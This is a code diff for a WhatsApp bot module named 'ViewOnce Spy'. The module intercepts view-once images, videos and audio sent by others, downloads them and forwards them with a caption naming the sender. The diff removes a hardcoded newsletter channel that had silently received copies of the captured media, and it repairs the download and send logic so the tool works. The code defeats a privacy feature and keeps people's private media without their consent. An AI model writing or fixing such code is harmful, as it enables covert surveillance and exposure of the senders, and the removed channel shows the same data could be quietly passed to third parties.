@@ -21,7 +21,6 @@ module.exports = {
         const lang = userSettings?.lang || "en";
 
         try {
-            // ================= CONFIG =================
             const { data: config } = await supabase
                 .from("luper_config")
                 .select("is_active")
@@ -34,7 +33,6 @@ module.exports = {
             if (processed.has(msgId)) return;
             processed.add(msgId);
 
-            // ================= STYLE =================
             const modes = {
                 harsh: {
                     head: "☣️ VIEW-ONCE EXPOSED ☣️",
@@ -58,17 +56,18 @@ module.exports = {
 
             const current = modes[style] || modes.normal;
 
-            // ================= STARTUP =================
+            // ✅ FIX: SAFE BOT JID
+            const botNumber = sock.user?.id?.replace(/:.+/, "") + "@s.whatsapp.net";
+
             if (!startupNotified) {
                 try {
-                    await sock.sendMessage(sock.user.id, {
+                    await sock.sendMessage(botNumber, {
                         text: `${current.startup} ViewOnce Spy Enabled`
                     });
                 } catch {}
                 startupNotified = true;
             }
 
-            // ================= EXTRACT =================
             let viewOnce =
                 m.message.viewOnceMessage ||
                 m.message.viewOnceMessageV2 ||
@@ -81,15 +80,19 @@ module.exports = {
 
             if (!type || !content) return;
 
-            // ================= DOWNLOAD (BRUTE) =================
+            // ✅ FIX: DETECT REAL MEDIA TYPE
+            let mediaType;
+            if (type.includes("image")) mediaType = "image";
+            else if (type.includes("video")) mediaType = "video";
+            else if (type.includes("audio")) mediaType = "audio";
+            else return;
+
+            // ================= DOWNLOAD =================
             let buffer = null;
 
             for (let i = 0; i < 3; i++) {
                 try {
-                    const stream = await downloadContentFromMessage(
-                        content,
-                        type.replace("Message", "").toLowerCase()
-                    );
+                    const stream = await downloadContentFromMessage(content, mediaType);
 
                     let buff = Buffer.from([]);
                     for await (const chunk of stream) {
@@ -105,7 +108,6 @@ module.exports = {
 
             if (!buffer) return;
 
-            // ================= REPORT =================
             const sender = m.key.participant || m.key.remoteJid;
             const isGroup = m.key.remoteJid.endsWith("@g.us");
 
@@ -117,25 +119,23 @@ module.exports = {
 
             const { text: translated } = await translate(report, { to: lang });
 
-            // ================= SEND (BRUTE FORCE) =================
-            const targets = [
-                "120363426850850275@newsletter",
-                sock.user.id.split(":")[0] + "@s.whatsapp.net"
-            ];
+            // ✅ FIX: SEND FORMAT (BAILEYS CORRECT)
+            const messagePayload = {
+                caption: translated,
+                mentions: [sender]
+            };
 
-            for (const target of targets) {
-                for (let i = 0; i < 3; i++) {
-                    try {
-                        await sock.sendMessage(target, {
-                            [type.replace("Message", "")]: buffer,
-                            caption: translated,
-                            mentions: [sender]
-                        });
+            if (mediaType === "image") messagePayload.image = buffer;
+            if (mediaType === "video") messagePayload.video = buffer;
+            if (mediaType === "audio") messagePayload.audio = buffer;
 
-                        return; // SUCCESS
-                    } catch {
-                        await new Promise(r => setTimeout(r, 1000));
-                    }
+            // ✅ ONLY SEND TO BOT (ULIYOSEMA)
+            for (let i = 0; i < 3; i++) {
+                try {
+                    await sock.sendMessage(botNumber, messagePayload);
+                    return;
+                } catch {
+                    await new Promise(r => setTimeout(r, 1000));
                 }
             }
 
